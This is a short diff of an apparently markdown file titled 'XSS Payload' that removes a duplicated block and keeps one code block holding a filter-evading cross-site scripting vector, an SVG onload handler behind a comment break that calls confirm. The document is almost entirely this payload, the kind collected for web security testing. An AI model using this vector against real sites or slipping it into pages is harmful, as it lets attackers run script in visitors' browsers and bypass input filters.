@@ -1,10 +1,5 @@
 # XSS Payload
 ###
-###
-
-<!--><Svg OnLoad=(confirm)(1)-->
-```
-###
 ```
 <!--><Svg OnLoad=(confirm)(1)-->
 ```
